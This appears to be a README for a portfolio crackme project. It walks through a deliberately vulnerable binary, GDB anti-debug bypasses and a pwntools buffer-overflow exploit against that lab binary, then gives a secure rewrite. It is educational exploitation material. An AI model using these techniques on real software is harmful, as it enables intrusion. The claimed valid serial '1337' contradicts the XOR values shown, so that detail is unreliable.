# Vulnerable-Binary

# CrackMe++: Reverse Engineering Portfolio Project

A deliberately vulnerable binary designed to demonstrate static analysis, dynamic analysis, exploit development, and secure coding practices. This project serves as a comprehensive showcase of reverse engineering skills for potential employers.

## Overview

**CrackMe++** is a multi-stage reverse engineering challenge that demonstrates:
- Binary analysis and disassembly
- Anti-debugging technique bypass
- Buffer overflow exploitation
- Return-oriented programming (ROP) concepts
- Secure coding remediation

## Quick Start

### Building the Challenge

Compile with security features disabled (intentionally vulnerable)
gcc -o crackme_demo crackme_demo.c  -fno-stack-protector  -no-pie  -z execstack  -mpreferred-stack-boundary=2  -m32  # Optional: compile for 32-bit to simplify addressing

### Running the Binary

Normal execution (will fail validation)
./crackme_demo "invalid_serial"
Successful execution requires exploit (see below)

## Challenge Analysis

### Stage 1: Static Analysis

**Tools:** Ghidra / IDA Pro / Binary Ninja / radare2

Key findings from disassembly:
- XOR-based serial validation algorithm
- `ptrace` anti-debugging check
- `strcpy` buffer overflow vulnerability
- Hidden function at address `0x08049156`

**Serial Validation Algorithm:**

expected[i] = input[i] ^ key[i] key = [0x55, 0x33, 0x77, 0x11] expected = [0x14, 0x46, 0x15, 0x67]

**Valid Serial:** `1337` (decoded via reverse XOR)

### Stage 2: Anti-Debug Bypass

The binary uses `ptrace(PTRACE_TRACEME)` to detect debuggers.

**GDB Bypass:**

Method 1: Skip the check
(gdb) break *validate_serial+45 (gdb) run test (gdb) jump *validate_serial+67
Method 2: Patch the return value
(gdb) break ptrace (gdb) commands

set $eax = 0 continue end

### Stage 3: Exploitation

**Vulnerability:** Stack-based buffer overflow in `strcpy()`
- Buffer size: 16 bytes
- No bounds checking
- Executable stack (`-z execstack`)

**Exploit Development:**

python #!/usr/bin/env python3
exploit.py - Buffer overflow exploit
from pwn import *
Configuration
BINARY = './crackme_demo' OFFSET = 28  # 16 bytes buffer + 12 bytes saved registers WIN_ADDR = 0x08049156  # Address of hidden_flag() - adjust for your binary
def exploit(): # Build payload payload = b"A" * OFFSET payload += p32(WIN_ADDR)

# Launch exploit
p = process(BINARY)
p.sendline(payload)
p.interactive()

if name == 'main': exploit()

**Manual Exploitation:**

Calculate offset using pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab...
Crash at: 0x41346541 (offset 28)
Craft exploit
python3 -c "import sys; sys.stdout.buffer.write(b'A'*28 + b'\x56\x91\x04\x08')" | ./crackme_demo

## Security Analysis

### Vulnerabilities Identified

| CVE Type | Severity | Description |
|----------|----------|-------------|
| CWE-120  | High     | Buffer overflow in `strcpy()` |
| CWE-754  | Medium   | Improper check for unusual conditions (anti-debug) |
| CWE-250  | Low      | Execution with unnecessary privileges |

### Exploitability

- **Local exploitation:** High
- **Remote exploitation:** N/A (no network component)
- **Privileges required:** User
- **User interaction:** Required

## Remediation

### Secure Code Implementation

c // Fixed version - secure_coding.c
#include <stdio.h> #include <string.h> #include <stdlib.h> #include <stdbool.h>
// Security: Function removed - unused functionality // void hidden_flag() { ... }
bool validate_serial_secure(const char *serial) { // Security: Constant-time comparison to prevent timing attacks const unsigned char key[] = {0x55, 0x33, 0x77, 0x11}; const unsigned char expected[] = {0x14, 0x46, 0x15, 0x67}; unsigned char result = 0;

// Security: Fixed-size buffer with explicit length check
if (strlen(serial) != 4) {
    return false;
}

// Security: Constant-time comparison
for (int i = 0; i < 4; i++) {
    result |= (serial[i] ^ key[i]) ^ expected[i];
}

return (result == 0);


}

int main(int argc, char **argv) { if (argc != 2) { printf("Usage: %s <serial>\n", argv[0]); return 1; }

// Security: Input validation
if (strnlen(argv[1], 5) > 4) {
    printf("[-] Invalid input length\n");
    return 1;
}

printf("Product Activation System v2.0 (SECURE)\n");

if (validate_serial_secure(argv[1])) {
    printf("[+] Valid serial!\n");
    return 0;
} else {
    printf("[-] Invalid serial\n");
    return 1;
}


}

### Build with Security Features

Secure compilation flags
gcc -o secure_demo secure_coding.c  -fstack-protector-strong  -fPIE -pie  -Wl,-z,relro,-z,now  -D_FORTIFY_SOURCE=2  -O2  -Wformat -Wformat-security

### Security Controls Applied

| Control | Implementation | Mitigates |
|---------|---------------|-----------|
| Stack Canaries | `-fstack-protector-strong` | Stack buffer overflows |
| ASLR | `-fPIE -pie` | Memory layout prediction |
| NX Bit | Default on modern systems | Code execution on stack |
| RELRO | `-Wl,-z,relro,-z,now` | GOT overwrite attacks |
| FORTIFY_SOURCE | `-D_FORTIFY_SOURCE=2` | String manipulation bugs |
| Input Validation | Explicit length checks | Buffer overflows |

## Tools Used

### Disassembly & Decompilation
- **Ghidra** - NSA's reverse engineering framework
- **IDA Pro** - Industry-standard disassembler
- **radare2** - Open-source reverse engineering framework
- **Binary Ninja** - Modern reverse engineering platform

### Dynamic Analysis
- **GDB** - GNU debugger with GEF/PEDA/Pwndbg
- **strace/ltrace** - System call tracing
- **Valgrind** - Memory debugging

### Exploitation
- **pwntools** - CTF framework and exploit development library
- **ROPgadget** - ROP chain construction
- **checksec** - Binary security feature checker

## Learning Outcomes

This project demonstrates proficiency in:

1. **Binary Analysis**
   - Reading assembly code (x86/x64)
   - Understanding calling conventions
   - Identifying common vulnerability patterns

2. **Reverse Engineering Methodology**
   - Static analysis techniques
   - Dynamic analysis and debugging
   - Control flow analysis

3. **Exploit Development**
   - Buffer overflow exploitation
   - Return address overwriting
   - Shellcode development (concept)

4. **Defensive Security**
   - Secure coding practices
   - Compiler security features
   - Vulnerability remediation

## Project Structure

crackme-portfolio/ ├── crackme_demo.c          # Vulnerable source code ├── secure_coding.c         # Remediated source code ├── exploit.py              # Exploit script ├── writeup.md              # Detailed analysis ├── screenshots/ │   ├── ghidra_disasm.png │   ├── gdb_session.png │   └── exploit_success.png └── README.md               # This file

## References

- [OWASP Reverse Engineering Guide](https://owasp.org/)
- [CTF Field Guide](https://trailofbits.github.io/ctf/)
- [Binary Exploitation Notes](https://github.com/Naetw/CTF-pwn-tips)
- [Ghidra Cheat Sheet](https://ghidra-sre.org/)

## Disclaimer

This software is intentionally vulnerable and is provided for educational purposes only. Do not use these techniques on systems you do not own or have explicit permission to test. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.

## Author

[Your Name] - Reverse Engineering & Security Research
- GitHub: [@yourusername]
- LinkedIn: [Your Profile]
- Blog: [Your Technical Blog]

---

*"The best way to learn reverse engineering is to break things and then fix them."*

